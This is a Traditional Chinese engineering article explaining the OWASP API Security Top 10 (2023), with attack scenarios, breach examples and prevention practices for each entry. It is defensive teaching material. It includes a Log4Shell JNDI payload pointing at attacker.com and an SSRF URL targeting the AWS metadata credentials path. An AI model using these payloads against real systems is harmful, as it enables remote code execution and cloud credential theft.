# [BEE-2008] OWASP API 安全 Top 10

:::info
OWASP API 安全 Top 10 是一份針對 API 最關鍵安全風險的優先排序清單——有別於一般的 OWASP Top 10——旨在協助團隊識別並修復對 REST、GraphQL、gRPC 及其他結構化 API 介面影響最深的漏洞。
:::

## 背景

API 與傳統 Web 應用程式的差異改變了整體威脅模型。API 透過結構化、機器可讀的端點公開應用程式邏輯與敏感資料，且被自動化客戶端所使用——行動應用程式、B2B 整合、第三方服務——這使得大量自動化濫用變得極為容易。API 公開更多端點，並且使用可預測的資源識別符（URL 中的整數 ID、一致的路徑模式），而其授權失敗更難以偵測，因為每個端點單獨看來都是正確的，但實際上卻授予了不應有的存取權限。

Erez Yalon、Inon Shkedy 與 Paulo Silva——時任職於 Checkmarx——共同發起了 OWASP API 安全專案。第一個穩定版本於 2019 年 12 月 26 日發布，基於漏洞懸賞平台、安全研究人員及產業調查的資料。2023 年版本於 2023 年 6 月 5 日發布，更新清單以反映四年來不斷演化的攻擊模式：新增了三個類別（SSRF、未受限制存取敏感業務流程、不安全 API 消費）；兩個 2019 年條目被合併（過度資料暴露與大量賦值合併為單一類別）；注入攻擊從專屬條目中移除；日誌記錄與監控不足則被完全捨棄。

2023 年前五名中有三項是授權失敗——BOLA、身份驗證失效，以及物件屬性層級授權失效。這種集中現象反映了 API 的結構性事實：身份驗證通常在閘道或框架層統一實作，而授權則必須在每個端點上各自正確實作。在數十乃至數百個端點上撰寫正確授權檢查的認知負荷，造成了數量不成比例的安全漏洞。

## 2023 年 Top 10

### API1:2023 — 物件層級授權失效（BOLA）

最普遍的 API 漏洞，在 2019 年和 2023 年清單中均位居第一。API 端點接受客戶端提供的物件識別符（整數、UUID、slug），並在未驗證已驗證使用者是否有權存取該物件的情況下，回傳或修改該物件。

BOLA 是 Web 應用程式安全中「不安全直接物件參考」（IDOR）的 API 專屬稱謂。兩者可互換使用；BOLA 是 OWASP 在 API 情境下的首選術語。

**攻擊情境**：一家汽車製造商的 API 接受車輛識別碼（VIN）並回傳車輛位置，但未執行所有權檢查——任何已驗證的使用者都可以透過提供 VIN 取得任何車輛的位置。Peloton 的 API（2021 年）在完全無需身份驗證的情況下，透過使用者 ID 回傳任何使用者的完整個人資料，包括設定為私密的帳戶，共暴露了 300 萬個帳戶。

**預防措施**：在存取使用客戶端提供識別符的資料庫物件的每個函式中，於業務邏輯層*內部*實作授權檢查——而非僅在路由或中介軟體層。使用不可預測的識別符（UUID v4）而非循序整數作為縱深防禦措施，但不可將其視為授權的替代品。撰寫自動化測試以嘗試跨使用者存取，並讓通過此測試的部署失敗。

---

### API2:2023 — 身份驗證失效

身份驗證機制對所有使用者開放，天然成為高價值攻擊目標。工程師往往建立自訂身份驗證方案、誤解 session 邊界語義，或在不同端點類型上不一致地應用控制措施。

**攻擊情境**：一個 API 將登入嘗試限制為每分鐘每請求三次。但 GraphQL 端點允許操作批次處理。攻擊者發送一個包含數百個登入 mutation 的單一 GraphQL 請求——每個憑證對應一個——完全繞過每請求速率限制，以規模化進行憑證填充攻擊。

**預防措施**：對密碼重設、電子郵件驗證及帳戶更新端點，應與登入端點採用相同的安全嚴謹度。對敏感操作（更改電子郵件、電話、付款方式）要求重新驗證身份。切勿使用 API 金鑰進行使用者身份驗證——改用標準化協定（OAuth 2.0、OpenID Connect）。應用具 GraphQL 感知的速率限制，以批次請求中的個別操作數量計算，而非僅計算 HTTP 請求數量。

---

### API3:2023 — 物件屬性層級授權失效

由兩個 2019 年類別合併而成（過度資料暴露、大量賦值），共同根本原因是：API 無法在個別屬性層級強制執行授權，包括讀取和寫入兩個方向。

**讀取面（過度資料暴露）**：API 序列化並回傳完整的模型物件，依賴客戶端來過濾敏感欄位。攻擊者繞過客戶端直接讀取所有回傳欄位——包括 `password_hash`、`ssn`、`credit_score`，或任何存在於資料庫列中的欄位。

**寫入面（大量賦值）**：API 將所有客戶端提供的 JSON 屬性繫結到伺服器端模型，而不使用允許清單。攻擊者修改本不應控制的屬性：`role`、`price`、`isAdmin`、`balance`。2012 年的 Homakov/GitHub 事件是典型案例：Egor Homakov 利用 Rails 大量賦值漏洞，透過在表單提交中注入 `public_key[user_id]`，將自己的 SSH 金鑰新增至 Rails 組織的 GitHub 帳戶，取得了官方 Rails 儲存庫的提交權限。

**預防措施**：明確列舉每個端點在回應中公開的欄位——不要使用通用的模型序列化。為每個端點維護客戶端可修改屬性的允許清單；拒絕或忽略允許清單之外的屬性。停用框架層級的大量賦值功能（`attr_protected` 不夠；應使用 `attr_accessible` 白名單或等效機制）。

---

### API4:2023 — 無限制資源消耗

缺乏每請求資源消耗限制（CPU、記憶體、網路頻寬、儲存空間、第三方 API 呼叫、金錢支出）的 API，容易遭受阻斷服務攻擊和失控成本。此條目從「缺乏資源與速率限制」更名，以強調速率限制單獨是不夠的；資源單位本身必須受到限制。

**攻擊情境**：一個密碼重設端點透過按訊息計費的服務觸發 SMS，每則 0.05 美元。攻擊者每分鐘呼叫端點數千次，在速率限制介入之前已造成數千美元損失。GraphQL 批次攻擊提交一個包含數百個圖片上傳 mutation 的請求，透過同步縮圖生成耗盡伺服器記憶體——繞過了每請求速率限制。

**預防措施**：強制限制字串、陣列、上傳檔案及回應酬載的最大大小。為 GraphQL 查詢深度、廣度和批次大小設置明確限制。應用容器或無伺服器的 CPU/記憶體約束。為所有第三方服務整合配置支出警報和硬性上限。設置執行逾時。驗證分頁參數——`limit=1000000` 的查詢參數應被拒絕，而非接受。

---

### API5:2023 — 功能層級授權失效

有別於 BOLA（存取錯誤的*物件*），這是關於呼叫使用者角色完全不應允許的功能或端點。管理端點、破壞性操作和高權限功能必須受到系統性應用的角色檢查保護，而非臨時性的個別實作。

**攻擊情境**：攻擊者推斷 API 的端點模式，呼叫 `/api/admin/v1/users/all`——猜測管理路徑。該端點上不存在功能層級授權檢查；完整的使用者資料庫被回傳。另一種情境中，攻擊者將 HTTP 方法從 `GET` 改為 `POST` 呼叫邀請端點，發現管理員專屬的邀請建立功能缺乏授權執行。

**預防措施**：實作一個集中的授權模組，為每個業務功能呼叫——而非每個控制器個別檢查。預設拒絕所有存取；要求對每個端點明確授予角色。系統性地審核所有 API 端點，而非僅在開發期間——枚舉每個動詞×路徑組合允許的角色，並驗證執行與規格相符。

---

### API6:2023 — 未受限制存取敏感業務流程

2023 年新增的類別，解決一類傳統安全缺陷所無法涵蓋的風險。API 正確地對使用者進行身份驗證和授權，但未能考量自動化、大量使用合法工作流程所造成的危害。攻擊目標是業務邏輯本身。

**攻擊情境**：攻擊者在人類客戶能反應之前，透過數百個 IP 位址自動化購買限量電玩主機，獲取大部分庫存以高價轉售。航空公司座位操縱攻擊預訂航班 90% 的座位後在起飛前取消，迫使折扣定價——再以較低價格購買。推薦計畫對每個新注冊自動發放點數；攻擊者自動化假注冊以累積點數。

**預防措施**：在設計階段識別哪些工作流程對自動化濫用敏感，而不僅僅是哪些資料敏感。應用裝置指紋識別來偵測只應由合法使用者呼叫的端點上的非瀏覽器客戶端。在關鍵轉換路徑上要求 CAPTCHA 或摩擦機制。依業務單位進行速率限制——依每帳戶或 IP 購買的商品數量，而非每秒 HTTP 請求數量。監控行為異常：時間模式、IP 多樣性、轉換率。

---

### API7:2023 — 伺服器端請求偽造（SSRF）

2023 年新增的專屬條目。SSRF 發生在 API 未經驗證即擷取使用者提供的 URL 所指定的遠端資源時，導致伺服器向內部網路位址、雲端元資料端點或其他意外目的地發出請求。

**攻擊情境**：Webhook 整合允許使用者配置事件發生時 API 呼叫的 URL。攻擊者配置 `http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm`——AWS 執行個體元資料服務端點。API 擷取該 URL，攻擊者收到臨時 IAM 憑證。

這正是 2019 年 Capital One 資料外洩事件的發生方式。Paige Thompson 利用 Capital One WAF 中的 SSRF 漏洞，透過 AWS EC2 元資料服務（執行 IMDSv1，對未驗證的 GET 請求做出回應）取得 IAM 憑證，並使用這些憑證從 S3 外洩了 1.06 億筆信用卡申請記錄。

**預防措施**：實作 URL 允許清單，限制目的地的來源、協定、連接埠和媒體類型。封鎖 RFC 1918 位址（`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`）和連結本地範圍（`169.254.0.0/16`）。停用 HTTP 重新導向，或在跟隨之前驗證重新導向目的地是否符合允許清單。切勿將原始擷取回應回傳給客戶端。在所有 EC2 執行個體上強制執行 IMDSv2——IMDSv2 需要預先 PUT 請求才能取得 session 權杖，並拒絕包含 `X-Forwarded-For` 的 PUT 請求，使基於 SSRF 的憑證竊取無效。

---

### API8:2023 — 安全設定錯誤

任何層面的設定錯誤——網路、作業系統、Web 伺服器、應用程式框架、雲端供應商、容器協調器——都可能暴露敏感資料或可執行功能。API 本身可能是正確的，但其周圍環境卻可能並非如此。

**攻擊情境**：某服務使用啟用了 JNDI 查找支援的日誌記錄函式庫。攻擊者發送一個 HTTP 請求，其標頭值為 `${jndi:ldap://attacker.com/Malicious.class}`。日誌函式庫展開佔位符，觸發遠端 LDAP 查找，並執行攻擊者的類別（Log4Shell 模式）。未附帶 `Cache-Control: no-store` 的 API 回應，允許私密 session 資料被寫入共用機器的瀏覽器快取，後續使用者可讀取。

**預防措施**：在部署時對所有堆疊層應用可重複的加固檢查清單。在所有 API 通訊（包括內部服務間流量）上強制執行 TLS。為每個端點定義允許的 HTTP 方法明確白名單。設置嚴格的 CORS 政策並加以驗證。驗證 `Content-Type` 標頭並拒絕不匹配的請求體。確保請求鏈中的所有伺服器以相同方式解析請求，以防止 HTTP 請求走私。

---

### API9:2023 — 不當庫存管理

API 隨時間累積版本、環境和整合。若無維護的庫存，舊版 API 將以過時的安全控制在生產環境中運行；測試或暫存環境在無速率限制的情況下暴露於網際網路；與第三方服務的整合累積了未受控的資料流權限。

**攻擊情境**：一個測試 API 主機執行與生產相同的端點，但無速率限制。安全研究人員發現它並暴力破解 6 位數的密碼重設權杖——在無速率限制的情況下需要 11 小時，在有速率限制的生產主機上則不可能完成。Facebook/Cambridge Analytica 事件遵循類似模式：一個獲得使用者同意的第三方應用程式利用過度授權的 Graph API 存取，檢索同意使用者的所有朋友資料，從 27 萬個同意中取得了 5000 萬個個人資料。

**預防措施**：維護所有 API 主機、版本和環境的完整庫存——包括誰可以存取它們。在 CI/CD 中從程式碼自動生成 API 文件（OpenAPI/Swagger），以保持庫存的即時性。對 API 的所有版本（包括尚未退役的已棄用版本）應用相同的安全控制。在棄用版本之前進行明確的風險分析，並定義帶有公告日期的日落時程。

---

### API10:2023 — 不安全的 API 消費

2023 年新增的條目。開發人員對從第三方 API 接收的資料，比直接從使用者接收的資料應用了更弱的輸入驗證。攻擊者入侵上游服務並注入惡意資料——SQL 注入酬載、重新導向目標、惡意內容——而目標系統未加審查地處理這些資料。

**攻擊情境**：攻擊者在第三方資料豐富化服務中植入 SQL 注入酬載。目標 API 擷取豐富化的業務資料，未經清理直接傳遞給 SQL 查詢，執行攻擊者的酬載對資料庫造成損害。另一種情境中，攻擊者入侵第三方醫療儲存服務，並配置 308 永久重新導向至其伺服器。目標 API 盲目跟隨重新導向，將敏感基因組資料傳輸給攻擊者的端點。

**預防措施**：將從第三方 API 接收的所有資料視為不信任的輸入——以與直接使用者輸入相同的嚴謹度進行驗證和清理。為所有 API 對 API 的通訊強制執行 TLS。維護允許的重新導向目的地白名單；切勿盲目跟隨 HTTP 重新導向。在整合前評估第三方 API 提供者的安全態勢、事件歷史和資料處理政策。

---

## 從 2019 到 2023 的變化

| 2019 版 | 2023 版 | 變化 |
|---|---|---|
| API1: 物件層級授權失效 | API1: 物件層級授權失效 | 不變（仍排名第一） |
| API2: 使用者身份驗證失效 | API2: 身份驗證失效 | 範圍擴大 |
| API3: 過度資料暴露 | API3: 物件屬性層級授權失效 | 與 API6:2019 合併 |
| API4: 缺乏資源與速率限制 | API4: 無限制資源消耗 | 更名，範圍擴大 |
| API5: 功能層級授權失效 | API5: 功能層級授權失效 | 不變 |
| API6: 大量賦值 | *(合併至 API3:2023)* | 與 API3:2019 合併 |
| API7: 安全設定錯誤 | API8: 安全設定錯誤 | 下移一位 |
| API8: 注入攻擊 | *(移除為專屬條目)* | 移除 |
| API9: 資產管理不當 | API9: 不當庫存管理 | 更名 |
| API10: 日誌記錄與監控不足 | *(移除)* | 移除 |
| *(新增)* | API6: 未受限制存取敏感業務流程 | 新增 |
| *(新增)* | API7: 伺服器端請求偽造 | 新增 |
| *(新增)* | API10: 不安全的 API 消費 | 新增 |

## 視覺化

```mermaid
flowchart TD
    subgraph "授權失效（前五名中三項）"
        A1["API1: BOLA\n物件層級授權缺失"]:::auth
        A3["API3: 屬性授權失效\n過度暴露 + 大量賦值"]:::auth
        A5["API5: 功能授權失效\n管理端點未受保護"]:::auth
    end

    subgraph "濫用與資源控制"
        A4["API4: 無限制資源消耗\n無資源/支出限制"]:::abuse
        A6["API6: 業務流程濫用\n自動化搶購/詐騙"]:::abuse
    end

    subgraph "身份驗證"
        A2["API2: 身份驗證失效\n憑證填充、弱 session"]:::authn
    end

    subgraph "基礎設施與供應鏈"
        A7["API7: SSRF\n內部網路/元資料存取"]:::infra
        A8["API8: 安全設定錯誤\n日誌庫、CORS、TLS"]:::infra
        A9["API9: 庫存管理不當\n舊版本、未追蹤環境"]:::infra
        A10["API10: 不安全 API 消費\n第三方資料不受信任"]:::infra
    end

    ATTACKER["攻擊者"]:::red
    API["你的 API"]:::api

    ATTACKER -->|"枚舉 ID"| A1
    ATTACKER -->|"憑證填充"| A2
    ATTACKER -->|"讀取隱藏欄位、注入角色"| A3
    ATTACKER -->|"SMS 轟炸、批次濫用"| A4
    ATTACKER -->|"呼叫管理端點"| A5
    ATTACKER -->|"搶購機器人"| A6
    ATTACKER -->|"Webhook SSRF"| A7
    ATTACKER -->|"Log4Shell、快取投毒"| A8
    ATTACKER -->|"找到未受保護的測試主機"| A9
    ATTACKER -->|"投毒上游 API"| A10

    A1 --> API
    A2 --> API
    A3 --> API
    A4 --> API
    A5 --> API
    A6 --> API
    A7 --> API
    A8 --> API
    A9 --> API
    A10 --> API

    style ATTACKER fill:#c0392b,color:#fff
    style API fill:#27ae60,color:#fff
    style A1 fill:#e74c3c,color:#fff
    style A2 fill:#e74c3c,color:#fff
    style A3 fill:#e74c3c,color:#fff
    style A4 fill:#e67e22,color:#fff
    style A5 fill:#e74c3c,color:#fff
    style A6 fill:#e67e22,color:#fff
    style A7 fill:#8e44ad,color:#fff
    style A8 fill:#8e44ad,color:#fff
    style A9 fill:#8e44ad,color:#fff
    style A10 fill:#8e44ad,color:#fff
```

## 最佳實踐

**MUST（必須）在業務邏輯層內部執行物件層級授權，而非僅在路由或中介軟體層。** 檢查「此使用者是否已驗證身份」的中介軟體，並不會檢查「此使用者是否擁有這個特定記錄」。每個使用客戶端提供 ID 的資料庫查詢都必須伴隨所有權或權限檢查。自動化跨使用者存取測試——使用者 A 嘗試存取使用者 B 的資源——MUST（必須）是 CI 流程的一部分。

**MUST（必須）將第三方 API 回應視為不信任的輸入。** 從上游服務流入 API 的資料，攜帶與直接使用者輸入相同的注入風險。驗證結構、清理內容，且在未經 schema 驗證的情況下，切勿將原始上游回應轉發給客戶端。

**MUST（必須）對 URL 中公開的資源使用不可預測的識別符（UUID v4）。** 循序整數 ID 可被枚舉。UUID 無法防止 BOLA，但可消除顯而易見的猜測向量，提高枚舉攻擊的成本。

**MUST（必須）在框架層強制資源限制。** HTTP 請求的速率限制是必要的，但不足夠。設置請求體、陣列、字串欄位、分頁限制、GraphQL 查詢深度和批次大小的最大值。為所有第三方整合配置支出上限。

**SHOULD（應該）為任何擷取使用者提供 URL 的端點實作基於允許清單的 URL 驗證。** 封鎖私有 IP 範圍（RFC 1918、連結本地），並根據明確的允許清單驗證協定、主機、連接埠和媒體類型。不允許 HTTP 重新導向，或在跟隨之前根據相同的允許清單驗證重新導向目的地。

**SHOULD（應該）維護即時的 API 庫存**，包含每個公開主機的環境、存取控制、身份驗證要求和版本。在 CI/CD 中從程式碼自動生成（OpenAPI）。對所有版本應用相同的安全控制——速率限制、身份驗證和授權在仍在服務流量的舊版 API 中不得退步。

**SHOULD（應該）對敏感業務流程應用行為速率限制，而非僅請求速率限制。** 搶購、憑證填充和推薦詐騙在正常的每請求速率限制內運作，但以異常的量或模式進行。衡量業務單位：每小時購買的商品、每 IP 建立的帳戶、每使用者的密碼重設嘗試。對偏離預期基準的行為發出警報並進行節流。

**MAY（可以）使用 API 安全測試工具**（OWASP ZAP、Burp Suite、42Crunch、StackHawk）整合到 CI/CD 中，在每個拉取請求上掃描 API 端點的已知漏洞模式，在到達生產環境之前捕獲退步。

## 相關 BEE

- [BEE-2001](owasp-top-10-for-backend.md) -- 後端的 OWASP Top 10：一般 Web 應用程式的 OWASP Top 10；本文涵蓋對應的 API 專屬清單
- [BEE-1005](../auth/rbac-vs-abac.md) -- RBAC vs ABAC 存取控制模型：API1（BOLA）和 API5（功能層級授權失效）預防措施背後的授權模型
- [BEE-12007](../resilience/rate-limiting-and-throttling.md) -- 速率限制與節流：API4（無限制資源消耗）和 API6（業務流程濫用）預防措施的實作機制
- [BEE-2002](input-validation-and-sanitization.md) -- 輸入驗證與清理：防止 API3（大量賦值）和 API10（不安全第三方資料消費）的技術基礎
- [BEE-2007](zero-trust-security-architecture.md) -- 零信任安全架構：若加以應用，可防止整類 API 授權失敗的架構方法

## 參考資料

- [OWASP API Security Top 10 2023 — OWASP](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [OWASP API Security Top 10 2023 Release Notes — OWASP](https://owasp.org/API-Security/editions/2023/en/0x04-release-notes/)
- [OWASP API Security Project — owasp.org](https://owasp.org/www-project-api-security/)
- [Capital One Data Breach — DOJ Case (2019)](https://www.justice.gov/usao-wdwa/united-states-v-paige-thompson)
- [AWS IMDSv2 Documentation — AWS](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [Venmo API Scraping Incident — TechCrunch (2019)](https://techcrunch.com/2019/06/16/millions-venmo-transactions-scraped/)
- [Peloton API User Data Exposure — TechCrunch (2021)](https://techcrunch.com/2021/05/05/peloton-bug-account-data-leak/)
- [GitHub Mass Assignment Vulnerability (Homakov, 2012)](http://homakov.blogspot.com/2012/03/how-to.html)
